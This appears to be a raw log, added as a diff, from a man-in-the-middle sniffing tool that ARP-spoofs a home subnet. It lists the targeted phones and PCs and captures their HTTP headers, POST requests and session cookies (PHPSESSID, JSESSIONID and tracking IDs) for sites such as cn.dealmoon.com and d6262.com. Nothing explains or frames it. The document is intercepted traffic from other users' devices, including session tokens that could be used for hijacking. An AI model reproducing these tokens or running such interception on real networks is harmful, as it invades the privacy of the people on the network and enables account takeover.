+  Content-Length : 16
+  Accept : application/json, text/javascript, */*; q=0.01
+  Origin : http://cn.dealmoon.com
+  X-Requested-With : XMLHttpRequest
+  User-Agent : Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
+  Content-Type : application/x-www-form-urlencoded; charset=UTF-8
+  Referer : http://cn.dealmoon.com/
+  Accept-Encoding : identity
+  Accept-Language : en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,ru;q=0.2,zh-TW;q=0.2,ja;q=0.2
+  Cookie : __gads=ID=9e43ba4ee057c487:T=1453132005:S=ALNI_Mai6CGE0oz2oglkmqFm_md31QvweA; __qca=P0-140395561-1454351897424; l=c; cmtlang=cn; searchHistoryData=ie80%7C%7C%E6%8A%A4%E8%82%9D; a1763_times=33; PHPSESSID=8c3f1a9fe29ccdb1bf34cbf805253b56; _ga=GA1.2.385969212.1453132005; Hm_lvt_aa1bd5db226a1bae87a0ffc02cee3d7b=1465056639,1465077991,1465141366,1465174387; Hm_lpvt_aa1bd5db226a1bae87a0ffc02cee3d7b=1465174387; rip=H; TopDealTimeCn=1465172026
+
+[BODY]
+
+  start : 1465172026
+
+
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[DESKTOP-2LU0P34/192.168.2.5 > 96.17.202.217:http] [COOKIE] [cn.dealmoon.com] __gads=ID; __qca=P0-140395561-1454351897424; l=c; cmtlang=cn; searchHistoryData=ie80%7C%7C%E6%8A%A4%E8%82%9D; a1763_times=33; PHPSESSID=8c3f1a9fe29ccdb1bf34cbf805253b56; Hm_lvt_aa1bd5db226a1bae87a0ffc02cee3d7b=1465056639,1465077991,1465141366,1465174387; Hm_lpvt_aa1bd5db226a1bae87a0ffc02cee3d7b=1465174387; rip=H; TopDealTimeCn=1465172026
+[DESKTOP-2LU0P34/192.168.2.5 > 96.17.202.217:http] [POST] http://cn.dealmoon.com/ws/?cmd=deal/NewDealNum
+
+[HEADERS]
+
+  Host : cn.dealmoon.com
+  Connection : close
+  Content-Length : 16
+  Accept : application/json, text/javascript, */*; q=0.01
+  Origin : http://cn.dealmoon.com
+  X-Requested-With : XMLHttpRequest
+  User-Agent : Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
+  Content-Type : application/x-www-form-urlencoded; charset=UTF-8
+  Referer : http://cn.dealmoon.com/
+  Accept-Encoding : identity
+  Accept-Language : en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,ru;q=0.2,zh-TW;q=0.2,ja;q=0.2
+  Cookie : __gads=ID=9e43ba4ee057c487:T=1453132005:S=ALNI_Mai6CGE0oz2oglkmqFm_md31QvweA; __qca=P0-140395561-1454351897424; l=c; cmtlang=cn; searchHistoryData=ie80%7C%7C%E6%8A%A4%E8%82%9D; a1763_times=33; PHPSESSID=8c3f1a9fe29ccdb1bf34cbf805253b56; _ga=GA1.2.385969212.1453132005; Hm_lvt_aa1bd5db226a1bae87a0ffc02cee3d7b=1465056639,1465077991,1465141366,1465174387; Hm_lpvt_aa1bd5db226a1bae87a0ffc02cee3d7b=1465174387; rip=H; TopDealTimeCn=1465172026
+
+[BODY]
+
+  start : 1465172026
+
+
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 98.137.201.232:https] [HTTPS] https://yts2.yql.vip.bf1.yahoo.com./
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[DESKTOP-2LU0P34/192.168.2.5 > 54.90.148.22:https] [HTTPS] https://ec2-54-90-148-22.compute-1.amazonaws.com./
+[192.168.2.6 > 98.137.201.232:https] [HTTPS] https://yts2.yql.vip.bf1.yahoo.com./
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[DESKTOP-2LU0P34/192.168.2.5 > 54.90.148.22:https] [HTTPS] https://ec2-54-90-148-22.compute-1.amazonaws.com./
+[192.168.2.6 > 98.137.201.232:https] [HTTPS] https://yts2.yql.vip.bf1.yahoo.com./
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 52.20.181.232:https] [HTTPS] https://ec2-52-20-181-232.compute-1.amazonaws.com./
+[192.168.2.6 > 98.137.201.232:https] [HTTPS] https://yts2.yql.vip.bf1.yahoo.com./
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 52.20.181.232:https] [HTTPS] https://ec2-52-20-181-232.compute-1.amazonaws.com./
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 98.137.201.232:https] [HTTPS] https://yts2.yql.vip.bf1.yahoo.com./
+[192.168.2.6 > 52.20.181.232:https] [HTTPS] https://ec2-52-20-181-232.compute-1.amazonaws.com./
+[192.168.2.6 > 98.137.201.232:https] [HTTPS] https://yts2.yql.vip.bf1.yahoo.com./
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 52.20.181.232:https] [HTTPS] https://ec2-52-20-181-232.compute-1.amazonaws.com./
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 60.250.141.167:http] [GET] http://www.d6262.com/favicon.ico
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=ddde2456856df9b3da961b85fe593f90
+[192.168.2.6 > 60.250.141.167:http] [GET] http://www.d6262.com/favicon.ico
+[192.168.2.3 > 203.205.166.148:https] [HTTPS] https://203.205.166.148/
+[192.168.2.3 > 203.205.166.148:https] [HTTPS] https://203.205.166.148/
+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.194.46:https] [HTTPS] https://dfw25s12-in-f14.1e100.net./
+[DESKTOP-2LU0P34/192.168.2.5 > 54.90.148.22:https] [HTTPS] https://ec2-54-90-148-22.compute-1.amazonaws.com./
+[192.168.2.6 > 98.137.201.232:https] [HTTPS] https://yts2.yql.vip.bf1.yahoo.com./
+[DESKTOP-2LU0P34/192.168.2.5 > 54.90.148.22:https] [HTTPS] https://ec2-54-90-148-22.compute-1.amazonaws.com./
+[192.168.2.6 > 174.123.15.41:http] [GET] http://iimaya.com/
+[192.168.2.6 > 174.123.15.41:http] [GET] http://iimaya.com/
+[192.168.2.3 > 203.205.166.148:https] [HTTPS] https://203.205.166.148/
+[192.168.2.6 > 173.192.161.22:http] [GET] http://www.bbsskys.com/
+[192.168.2.6 > 173.192.161.22:http] [GET] http://www.bbsskys.com/
+[DESKTOP-2LU0P34/192.168.2.5 > 54.90.148.22:https] [HTTPS] https://ec2-54-90-148-22.compute-1.amazonaws.com./
+[192.168.2.6 > 98.137.201.232:https] [HTTPS] https://yts2.yql.vip.bf1.yahoo.com./
+[192.168.2.6 > 173.192.168.164:http] [COOKIE] [www.edegmaya.com] cdb_sid=1EHeQE
+[192.168.2.6 > 173.192.168.164:http] [POST] http://www.edegmaya.com/index.php
+[I] Starting [ spoofing:✔ discovery:✔ sniffer:✔ tcp-proxy:✘ http-proxy:✘ https-proxy:✘ sslstrip:✘ http-server:✘ dns-server:✘ ] ...
+
+
+[I] [en0] 192.168.2.2 : AC:BC:32:9C:A9:01 / en0 ( Apple )
+[I] [GATEWAY] 192.168.2.1 : 08:86:3B:F0:F5:B2 ( Belkin International )
+[I] [DISCOVERY] Targeting the whole subnet 192.168.2.0..192.168.2.255 ...
+[I] Acquired 3 new targets :
+
+  [NEW] 192.168.2.3 : 9C:D9:17:38:ED:9B ( Motorola Mobility, a Lenovo Company )
+  [NEW] 192.168.2.6 : 64:BC:0C:4D:B2:78 ( LG Electronics )
+  [NEW] 224.0.0.251 : 01:00:5E:00:00:FB ( ??? )
+
+
+[192.168.2.5 > 131.253.34.251:https] [HTTPS] https://bn3sch020010633.wns.windows.com./
+[192.168.2.5 > 131.253.34.251:https] [HTTPS] https://bn3sch020010633.wns.windows.com./
+[192.168.2.6 > 216.58.194.142:https] [HTTPS] https://dfw06s49-in-f14.1e100.net./
+[192.168.2.6 > 216.58.194.142:https] [HTTPS] https://dfw06s49-in-f14.1e100.net./
+[192.168.2.3 > 123.58.189.26:http] [POST] http://m.analytics.126.net/news/c
+[I] Starting [ spoofing:✔ discovery:✔ sniffer:✔ tcp-proxy:✘ http-proxy:✘ https-proxy:✘ sslstrip:✘ http-server:✘ dns-server:✘ ] ...
+
+
+[I] [en0] 192.168.2.2 : AC:BC:32:9C:A9:01 / en0 ( Apple )
+[I] [GATEWAY] 192.168.2.1 : 08:86:3B:F0:F5:B2 ( Belkin International )
+[I] [DISCOVERY] Targeting the whole subnet 192.168.2.0..192.168.2.255 ...
+[I] Acquired 3 new targets :
+
+  [NEW] 192.168.2.3 : 9C:D9:17:38:ED:9B ( Motorola Mobility, a Lenovo Company )
+  [NEW] 192.168.2.6 : 64:BC:0C:4D:B2:78 ( LG Electronics )
+  [NEW] 224.0.0.251 : 01:00:5E:00:00:FB ( ??? )
+
+
+
+
